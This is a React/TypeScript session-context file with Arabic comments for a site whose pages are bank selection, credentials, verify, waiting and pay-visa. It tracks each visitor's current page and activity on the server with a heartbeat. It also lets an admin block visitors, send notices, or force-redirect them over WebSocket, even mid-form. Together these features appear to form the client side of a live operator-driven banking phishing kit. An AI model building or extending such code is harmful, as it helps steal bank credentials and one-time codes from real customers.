// سياق الجلسة - تتبع جلسة المستخدم مع دعم WebSocket والإشعارات والحظر والتوجيه
import React, { createContext, useContext, useEffect, useState, useRef, useCallback } from "react";
import { useLocation } from "wouter";
import { useWebSocket } from "./WebSocketContext";

const BASE = import.meta.env.BASE_URL.replace(/\/$/, "");

interface SessionContextType {
  sessionId: string | null;
  applicationId: number | null;
  selectedBank: number | null;
  isBlocked: boolean;
  blockedReason: string | null;
  notification: string | null;
  clearNotification: () => void;
  setApplicationId: (id: number | null) => void;
  setSelectedBank: (id: number | null) => void;
}

const SessionContext = createContext<SessionContextType | undefined>(undefined);

function isValidSessionId(id: string | null): id is string {
  return !!id && id !== "undefined" && id !== "null" && id.length > 8;
}

const PAGE_ROUTES: Record<string, string> = {
  home: "/",
  "applicant-info": "/apply",
  apply: "/apply",
  banks: "/apply/banks",
  credentials: "/apply/credentials",
  verify: "/apply/verify",
  waiting: "/apply/waiting",
  success: "/apply/success",
  "pay-visa": "/pay-visa",
};

export function SessionProvider({ children }: { children: React.ReactNode }) {
  const [location, navigate] = useLocation();
  const { subscribe } = useWebSocket();

  const rawId = localStorage.getItem("sessionId");
  const [sessionId, setSessionId] = useState<string | null>(
    isValidSessionId(rawId) ? rawId : null
  );
  const [applicationId, setAppId] = useState<number | null>(
    localStorage.getItem("applicationId") ? Number(localStorage.getItem("applicationId")) : null
  );
  const [selectedBank, setBankId] = useState<number | null>(
    localStorage.getItem("selectedBank") ? Number(localStorage.getItem("selectedBank")) : null
  );
  const [isBlocked, setIsBlocked] = useState(false);
  const [blockedReason, setBlockedReason] = useState<string | null>(null);
  const [notification, setNotification] = useState<string | null>(null);
  const sessionIdRef = useRef(sessionId);
  sessionIdRef.current = sessionId;
  const locationRef = useRef(location);
  locationRef.current = location;

  // ─── فحص التنقل المعلّق عند إعادة تحميل الصفحة ─────────────────────────
  // يُنفَّذ مرة واحدة فقط عند التحميل الأول لجلسة موجودة مسبقاً
  useEffect(() => {
    // لا نتدخل في صفحات الإدارة أبداً
    if (location.startsWith("/admin")) return;
    const sid = isValidSessionId(rawId) ? rawId : null;
    if (!sid) return;

    fetch(`${BASE}/api/sessions/${sid}`)
      .then((r) => r.ok ? r.json() : null)
      .then((data) => {
        if (data?.pendingNavigation) {
          // دعم التنسيق الجديد (JSON) والتنسيق القديم (string)
          let page: string;
          let applicationId: number | null = null;
          
          if (typeof data.pendingNavigation === "string") {
            page = data.pendingNavigation;
          } else {
            page = data.pendingNavigation.page;
            applicationId = data.pendingNavigation.applicationId;
          }
          
          let route = PAGE_ROUTES[page] || (page.startsWith("/") ? page : `/${page}`);
          if (applicationId) {
            route += `?applicationId=${applicationId}&session=${sid}`;
          }
          // مسح التنقل المعلّق في قاعدة البيانات
          fetch(`${BASE}/api/sessions/${sid}`, {
            method: "PATCH",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ pendingNavigation: null }),
          }).catch(() => {});
          navigate(route);
        }
      })
      .catch(() => {});
  }, []); // eslint-disable-line react-hooks/exhaustive-deps

  // ─── إنشاء جلسة جديدة إذا لم تكن موجودة (يُتجاهل للمدير) ──────────────
  useEffect(() => {
    // صفحات الإدارة لا تُسجَّل كزيارات إطلاقاً
    if (location.startsWith("/admin")) return;
    if (!isValidSessionId(sessionId)) {
      localStorage.removeItem("sessionId");
      fetch(`${BASE}/api/sessions`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ currentPage: location || "home" }),
      })
        .then((r) => r.ok ? r.json() : null)
        .then((data) => {
          if (data?.id && isValidSessionId(data.id)) {
            setSessionId(data.id);
            sessionIdRef.current = data.id;
            localStorage.setItem("sessionId", data.id);
          }
        })
        .catch(() => {});
    }
  }, []); // eslint-disable-line react-hooks/exhaustive-deps

  // ─── تحديث الصفحة الحالية في الخادم ─────────────────────────────────────
  useEffect(() => {
    // لا نُحدِّث الجلسة أثناء تصفح الإدارة
    if (location.startsWith("/admin")) return;
    const sid = sessionIdRef.current;
    if (!isValidSessionId(sid)) return;
    fetch(`${BASE}/api/sessions/${sid}`, {
      method: "PATCH",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ currentPage: location }),
    }).catch(() => {});
  }, [location]);

  // ─── تتبع حالة النشاط (Page Visibility API + Heartbeat) ─────────────────
  const sendActivity = useCallback((active: boolean) => {
    // لا نُرسل نبضات قلب من صفحات الإدارة
    if (locationRef.current.startsWith("/admin")) return;
    const sid = sessionIdRef.current;
    if (!isValidSessionId(sid)) return;
    fetch(`${BASE}/api/sessions/${sid}`, {
      method: "PATCH",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ isActive: active }),
    }).catch(() => {});
  }, []);

  useEffect(() => {
    const handleVisibility = () => {
      sendActivity(document.visibilityState === "visible");
    };
    document.addEventListener("visibilitychange", handleVisibility);

    const heartbeat = setInterval(() => {
      if (document.visibilityState === "visible") {
        sendActivity(true);
      }
    }, 20000);

    const handleUnload = () => sendActivity(false);
    window.addEventListener("beforeunload", handleUnload);

    return () => {
      document.removeEventListener("visibilitychange", handleVisibility);
      window.removeEventListener("beforeunload", handleUnload);
      clearInterval(heartbeat);
    };
  }, [sendActivity]);

  // ─── الاستماع لرسائل WebSocket ──────────────────────────────────────────
  useEffect(() => {
    return subscribe((msg) => {
      const sid = sessionIdRef.current;
      const isForMe = !msg.sessionId || msg.sessionId === sid;

      if (msg.type === "user_blocked" && isForMe) {
        setIsBlocked(true);
        setBlockedReason((msg.reason as string) || "تم حظرك من قِبل المدير");
      }
      if (msg.type === "user_unblocked" && isForMe) {
        setIsBlocked(false);
        setBlockedReason(null);
      }
      if (msg.type === "notification" && isForMe) {
        setNotification(msg.message as string);
      }
      if (msg.type === "notification_all") {
        setNotification(msg.message as string);
      }
      // توجيه المستخدم من المدير — لا يُطبَّق على صفحات الإدارة أبداً
      if (msg.type === "navigate_user" && isForMe && !locationRef.current.startsWith("/admin")) {
        const page = (msg.page || msg.targetStep) as string;
        let route = PAGE_ROUTES[page] || (page?.startsWith("/") ? page : `/${page}`);
        // إضافة applicationId و sessionId للتوجيه إذا كانا موجودين
        if (msg.applicationId && route) {
          const params = new URLSearchParams();
          params.set("applicationId", msg.applicationId.toString());
          if (msg.sessionId) {
            params.set("session", msg.sessionId);
          }
          route += `?${params.toString()}`;
        }
        if (route) {
          // مسح pendingNavigation إذا كان لدينا session
          if (sid) {
            fetch(`${BASE}/api/sessions/${sid}`, {
              method: "PATCH",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({ pendingNavigation: null }),
            }).catch(() => {});
          }
          // إعادة تحميل كاملة تضمن الانتقال حتى لو كان المستخدم يملأ نموذجاً
          window.location.href = BASE + route;
        }
      }
    });
  }, [subscribe, navigate]);

  const setApplicationId = (id: number | null) => {
    setAppId(id);
    if (id) localStorage.setItem("applicationId", id.toString());
    else localStorage.removeItem("applicationId");
  };

  const setSelectedBank = (id: number | null) => {
    setBankId(id);
    if (id) localStorage.setItem("selectedBank", id.toString());
    else localStorage.removeItem("selectedBank");
  };

  return (
    <SessionContext.Provider value={{
      sessionId,
      applicationId,
      selectedBank,
      isBlocked,
      blockedReason,
      notification,
      clearNotification: () => setNotification(null),
      setApplicationId,
      setSelectedBank,
    }}>
      {children}
    </SessionContext.Provider>
  );
}

export function useSession() {
  const ctx = useContext(SessionContext);
  if (!ctx) throw new Error("useSession must be inside SessionProvider");
  return ctx;
}
